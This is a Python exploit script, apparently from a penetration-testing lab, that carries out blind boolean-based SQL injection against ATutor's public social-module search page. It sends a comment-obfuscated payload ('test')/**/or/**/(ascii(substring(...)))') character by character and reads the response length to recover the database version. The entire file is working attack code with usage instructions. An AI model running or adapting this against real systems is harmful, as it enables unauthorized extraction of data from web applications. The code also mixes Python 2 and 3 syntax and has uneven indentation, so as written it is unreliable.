import sys
import re
import requests
from bs4 import BeautifulSoup


def query_sqli(ip, injection_string):
    for j in range(32, 126):
    	target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, injection_string.replace("[CHAR]",str(j)))
    	#print("query target: %s ", target)
    	r = requests.get(target)
    	s = BeautifulSoup(r.text, 'lxml')
    	content_length = int(r.headers['Content-Length'])
    	#print("response content-length : %s ", str(content_length))
    	if content_length > 20:
    		return j
    return None
    
def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target> " % sys.argv[0]
        print '(+) eg: %s 192.168.1.100 ' %sys.argv[0]
    ip = sys.argv[1]
    print("Obtaining Database version .....")
    for i in range(1,22):
    	injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
    	#print("Injection string : %s", injection_string)
    	value = query_sqli(ip, injection_string)
    	if value  and  value != "":
    		sys.stdout.write(chr(value))
    		sys.stdout.flush()
    print("\nEnd stracted version!")

if __name__ == "__main__":
    main()
